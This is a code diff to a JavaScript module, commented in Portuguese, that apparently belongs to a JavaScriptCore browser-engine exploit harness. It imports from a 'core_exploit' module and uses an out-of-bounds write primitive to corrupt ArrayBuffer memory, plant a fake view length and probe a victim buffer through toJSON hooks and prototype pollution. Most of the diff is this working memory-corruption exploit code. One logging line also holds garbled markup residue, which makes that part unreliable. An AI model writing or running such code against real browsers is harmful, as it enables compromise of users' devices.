@@ -9,17 +9,17 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE = "VictimABInteractionTest_v25"; // Para ser usado pelo orquestrador
+export const FNAME_MODULE = "VictimABInteractionTest_v25";
 
-const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
+const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
 const VICTIM_AB_SIZE = 64;
 let probe_results_v25 = null;
 
 // --- Variantes da toJSON para Sondar victim_ab ---
 
-export function toJSON_V25_BaseProbe() { // Era toJSON_MinimalProbeOnVictim_v25
-    probe_results_v25 = { variant: "V25_BaseProbe", this_type: "N/A", error: null };
-    try { probe_results_v25.this_type = Object.prototype.toString.call(this); } 
+export function toJSON_V25_BaseProbe() {
+    probe_results_v25 = { variant: "V25_BaseProbe", this_type: "N/A_before_call", error: null };
+    try { probe_results_v25.this_type = Object.prototype.toString.call(this); }
     catch (e) { probe_results_v25.error = `${e.name}: ${e.message}`; }
     return probe_results_v25;
 }
@@ -39,7 +39,7 @@ export function toJSON_V25_B_AccessNonExistentProp() {
     probe_results_v25 = { variant: "V25_B_AccessNonExistentProp", this_type: "N/A", prop_value: "N/A", error: null };
     try {
         probe_results_v25.this_type = Object.prototype.toString.call(this);
-        probe_results_v25.prop_value = this.non_existent_prop_abc123; // Tenta ler propriedade inexistente
+        probe_results_v25.prop_value = this.non_existent_prop_abc123;
     } catch (e) { probe_results_v25.error = `${e.name}: ${e.message}`; }
     return probe_results_v25;
 }
@@ -53,22 +53,22 @@ export function toJSON_V25_C_ObjectKeys() {
     return probe_results_v25;
 }
 
-// executeSingleTest e a função exportada principal
 export async function executeVictimABProbeTest(
     testDescription,
     toJSONFunctionToUse,
-    corruptionOffset, // Offset no oob_array_buffer_real para corrupção
-    valueForCorruption   // Valor a ser escrito
+    corruptionOffset,
+    valueForCorruption
 ) {
     const FNAME_CURRENT_TEST = `executeVictimABProbe<${testDescription}>`;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST} ---`, "test", FNAME_CURRENT_TEST);
     document.title = `Probing victim_ab - ${testDescription}`;
 
-    probe_results_v25 = null; // Resetar para cada sub-teste
+    probe_results_v25 = null;
     let errorCapturedMain = null;
     let stringifyOutput = null;
-    let didCrash = true; 
+    let didCrash = true;
     let lastStep = "init";
+    const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58; // Definido localmente ou importado se for global
 
     try {
         lastStep = "oob_setup";
@@ -76,20 +76,16 @@ export async function executeVictimABProbeTest(
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        // Opcional: Plantar estrutura fake para consistência com o que causava o crash original,
-        // mesmo que o alvo do JSON.stringify seja victim_ab.
-        // O importante é o estado da memória causado pela escrita em 'corruptionOffset'.
-        const FAKE_VIEW_BASE = 0x58;
-        const M_LENGTH_OFFSET_IN_FAKE_VIEW = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
-        if (!isNaN(M_LENGTH_OFFSET_IN_FAKE_VIEW)) {
-             oob_write_absolute(FAKE_VIEW_BASE + M_LENGTH_OFFSET_IN_FAKE_VIEW, 0x100, 4); // m_length seguro
-             logS3(`   (Contexto: m_length inicial de estrutura fake em ${toHex(FAKE_VIEW_BASE)} setado para 0x100 em ${toHex(FAKE_VIEW_BASE + M_LENGTH_OFFSET_IN_FAKE_VIEW)})`, "info", FNAME_CURRENT_TEST);
+        const M_LENGTH_OFFSET_IN_VIEW_STRUCT_parsed = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
+        if (!isNaN(M_LENGTH_OFFSET_IN_VIEW_STRUCT_parsed)) {
+             const initialWriteOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + M_LENGTH_OFFSET_IN_VIEW_STRUCT_parsed;
+             oob_write_absolute(initialWriteOffset, 0x100, 4); 
+             logS3(`   (Contexto: m_length inicial de estrutura fake em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} setado para 0x100 em ${toHex(initialWriteOffset)})`, "info", FNAME_CURRENT_TEST);
         }
-
 
         lastStep = "critical_oob_write";
         logS3(`   CORRUPÇÃO: Escrevendo <span class="math-inline">\{toHex\(valueForCorruption\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionOffset)}]...`, "warn", FNAME_CURRENT_TEST);
-        oob_write_absolute(corruptionOffset, valueForCorruption, 4); // Assumindo 4 bytes para 0xFFFFFFFF
+        oob_write_absolute(corruptionOffset, valueForCorruption, 4);
         logS3(`     Escrita OOB em ${toHex(corruptionOffset)} realizada.`, "info", FNAME_CURRENT_TEST);
 
         await PAUSE_S3(50);
@@ -118,15 +114,9 @@ export async function executeVictimABProbeTest(
 
             logS3(`   JSON.stringify(victim_ab) completou. Resultado da toJSON: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
-            if (stringifyOutput && stringifyOutput.error) { // Checa se a toJSON retornou um erro
-                logS3(`     ERRO DENTRO da ${toJSONFunctionToUse.name}: ${stringifyOutput.error}`, "error", FNAME_CURRENT_TEST);
-                // Considerar este erro capturado como o erro principal do teste se não houver outro
+            if (stringifyOutput && stringifyOutput.error) {
                 if(!errorCapturedMain) errorCapturedMain = new Error(stringifyOutput.error);
-            } else if (stringifyOutput && stringifyOutput.probe_called) {
-                logS3(`     ${toJSONFunctionToUse.name} foi chamada. Tipo de 'this': ${stringifyOutput.this_type}`, "good", FNAME_CURRENT_TEST);
             }
-
-
         } catch (e_str) {
             errorCapturedMain = e_str;
             didCrash = false; 
@@ -139,7 +129,6 @@ export async function executeVictimABProbeTest(
                 else delete Object.prototype[ppKey];
             }
         }
-
     } catch (e_outer) {
         errorCapturedMain = e_outer;
         didCrash = false; 
@@ -153,7 +142,7 @@ export async function executeVictimABProbeTest(
     return { 
         test_description: testDescription,
         errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: didCrash, // Se o try principal completou sem erro, mas stringify pode ter crashado sem ser pego
-        toJSON_results: probe_results_v25 // Usando a variável de escopo do módulo preenchida pela toJSON
+        potentiallyCrashed: didCrash, 
+        toJSON_results: probe_results_v25 
     };
 }
